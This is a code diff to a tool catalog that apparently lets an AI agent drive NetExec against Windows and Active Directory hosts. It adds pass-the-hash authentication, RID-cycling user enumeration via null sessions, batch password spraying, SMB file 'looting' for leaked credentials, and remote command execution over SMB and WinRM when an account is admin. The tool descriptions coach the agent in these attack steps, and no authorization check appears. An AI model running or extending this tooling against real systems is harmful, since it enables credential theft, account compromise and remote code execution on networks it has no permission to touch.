@@ -42,12 +42,40 @@ def _creds(kwargs: dict) -> list[str]:
     return out
 
 
+def _nxc_auth(k: dict, guest_default: bool = False) -> list[str]:
+    """NetExec auth fragment supporting password OR pass-the-hash, an empty
+    password (guest/null session), and an optional domain.
+
+    - username + hash  -> -u user -H <ntlm>   (pass-the-hash)
+    - username + pass  -> -u user -p <pass>
+    - username only    -> -u user -p ''       (guest/null session)
+    - guest_default    -> defaults username to 'guest' when none supplied
+    """
+    out: list[str] = []
+    user = k.get("username") or ("guest" if guest_default else "")
+    if user:
+        out += ["-u", _s(user)]
+    if k.get("hash"):
+        out += ["-H", _s(k["hash"])]
+    elif user:
+        out += ["-p", _s(k.get("password", "") or "")]
+    if k.get("domain"):
+        out += ["-d", _s(k["domain"])]
+    return out
+
+
 # Reusable parameter fragments -------------------------------------------------
 _TARGET = {"target": {"type": "string", "description": "Host or IP."}}
 _URL = {"url": {"type": "string", "description": "Full URL incl. scheme/port."}}
 _AUTH = {
     "username": {"type": "string", "description": "Username (optional)."},
     "password": {"type": "string", "description": "Password (optional)."},
+}
+# Auth fragment that also allows pass-the-hash and a domain (for AD tooling).
+_AUTH_H = {
+    **_AUTH,
+    "hash": {"type": "string", "description": "NTLM hash for pass-the-hash "
+             "(use instead of password, e.g. from a dumped/backup credential)."},
 }
 _DOMAIN = {"domain": {"type": "string", "description": "Domain, e.g. corp.local or example.com."}}
 _WORDLIST = {"wordlist": {"type": "string", "description": "Wordlist path (optional)."}}
@@ -177,29 +205,85 @@ CATALOG: list[CommandSpec] = [
     # canonical-variable → CLI-switch translation (username → -u, etc.).
     CommandSpec(
         name="netexec_smb",
-        description="Enumerate SMB on a host with NetExec: OS/domain info, and "
-                    "with creds, shares/users/passwordpolicy. protocol fixed to smb.",
+        description="Enumerate/authenticate SMB on a host with NetExec: OS/domain "
+                    "info; with creds or a hash (pass-the-hash) it lists "
+                    "shares/users/pass-pol, and can run a command (-x) when the "
+                    "account is admin (look for 'Pwn3d!'). protocol fixed to smb.",
         binary="nxc",
-        parameters=_params({**_TARGET, **_AUTH,
+        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
             "enumerate": {"type": "string", "description": "One of: shares, users, "
-                          "groups, pass-pol, loggedon-users, sessions, disks. Optional."}},
+                          "groups, pass-pol, loggedon-users, sessions, disks. Optional."},
+            "command": {"type": "string", "description": "Command to run via -x when "
+                        "the account is a local admin (optional)."}},
             ["target"]),
-        subcommand=["smb"],
-        positional=["target"],
-        flags={"username": "-u", "password": "-p", "enumerate": "--{v}"},
+        build_args=lambda k: ["smb", _s(k["target"])] + _nxc_auth(k)
+                             + (["--" + _s(k["enumerate"])] if k.get("enumerate") else [])
+                             + (["-x", _s(k["command"])] if k.get("command") else []),
         install_hint="pipx install netexec (provides nxc).",
+    ),
+    CommandSpec(
+        name="netexec_rid_brute",
+        description="Enumerate ALL domain users by RID-cycling over SMB. Works with a "
+                    "guest/null session (no creds) or any valid account — the primary "
+                    "way to build a user list on an AD DC when you have none.",
+        binary="nxc",
+        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
+            "max_rid": {"type": "string", "description": "Highest RID to try. Default 4000."}},
+            ["target"]),
+        build_args=lambda k: ["smb", _s(k["target"])] + _nxc_auth(k, guest_default=True)
+                             + ["--rid-brute", _s(k.get("max_rid", "4000"))],
+        install_hint="pipx install netexec.",
+    ),
+    CommandSpec(
+        name="netexec_spray",
+        description="Password-spray a user list over SMB in ONE batch (server-side, "
+                    "fast) — this is the correct way to test many accounts, never "
+                    "one-by-one. Give userfile plus either a single password, a "
+                    "passfile, or userpass='true' to try username==password. Uses "
+                    "--no-bruteforce (one attempt per user) to avoid lockout.",
+        binary="nxc",
+        parameters=_params({**_TARGET, **_DOMAIN,
+            "userfile": {"type": "string", "description": "Path to a usernames file (one per line)."},
+            "password": {"type": "string", "description": "Single password to spray (optional)."},
+            "passfile": {"type": "string", "description": "Path to a passwords file (optional)."},
+            "userpass": {"type": "string", "description": "'true' to try username==password."}},
+            ["target", "userfile"]),
+        build_args=lambda k: ["smb", _s(k["target"]), "-u", _s(k["userfile"]), "-p",
+                              (_s(k["userfile"]) if _s(k.get("userpass", "")).lower()
+                               in ("true", "1", "yes")
+                               else _s(k["passfile"]) if k.get("passfile")
+                               else _s(k.get("password", "")))]
+                             + (["-d", _s(k["domain"])] if k.get("domain") else [])
+                             + ["--no-bruteforce", "--continue-on-success"],
+        install_hint="pipx install netexec.",
+    ),
+    CommandSpec(
+        name="smb_get",
+        description="Download a file from an SMB share (creds or pass-the-hash) to "
+                    "loot it — e.g. a backup/config that leaks credentials. Saves to "
+                    "the logs dir. Give the share name and the remote file path.",
+        binary="nxc",
+        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
+            "share": {"type": "string", "description": "Share name, e.g. backup."},
+            "path": {"type": "string", "description": "Remote file path in the share, e.g. backup_extract.txt."}},
+            ["target", "share", "path"]),
+        build_args=lambda k: ["smb", _s(k["target"])] + _nxc_auth(k)
+                             + ["--share", _s(k["share"]), "--get-file", _s(k["path"]),
+                                "loot_" + _s(k["path"]).replace("\\", "_").replace("/", "_")],
+        install_hint="pipx install netexec.",
     ),
     # Added purely declaratively — shows how little a new tool needs.
     CommandSpec(
         name="netexec_winrm",
-        description="Check WinRM (5985/5986) access and run whoami with NetExec. "
-                    "Great for validating creds give remote-exec.",
+        description="Check WinRM (5985/5986) access with NetExec (creds or "
+                    "pass-the-hash) and run a command (default whoami). Validates that "
+                    "an account gives remote code execution ('Pwn3d!').",
         binary="nxc",
-        parameters=_params({**_TARGET, **_AUTH}, ["target"]),
-        subcommand=["winrm"],
-        positional=["target"],
-        flags={"username": "-u", "password": "-p"},
-        fixed=["-x", "whoami"],
+        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
+            "command": {"type": "string", "description": "Command to run (default whoami)."}},
+            ["target"]),
+        build_args=lambda k: ["winrm", _s(k["target"])] + _nxc_auth(k)
+                             + ["-x", _s(k.get("command") or "whoami")],
         install_hint="pipx install netexec.",
     ),
     CommandSpec(
@@ -207,11 +291,11 @@ CATALOG: list[CommandSpec] = [
         description="Query LDAP/AD via NetExec (with creds): users, groups, and "
                     "Kerberoast/asreproast discovery.",
         binary="nxc",
-        parameters=_params({**_TARGET, **_AUTH,
+        parameters=_params({**_TARGET, **_AUTH_H, **_DOMAIN,
             "action": {"type": "string", "description": "e.g. '--users', "
                        "'--kerberoasting out.txt', '--asreproast out.txt'. Optional."}},
             ["target"]),
-        build_args=lambda k: ["ldap", _s(k["target"])] + _creds(k)
+        build_args=lambda k: ["ldap", _s(k["target"])] + _nxc_auth(k)
                              + (_s(k["action"]).split() if k.get("action") else []),
         install_hint="pipx install netexec.",
     ),
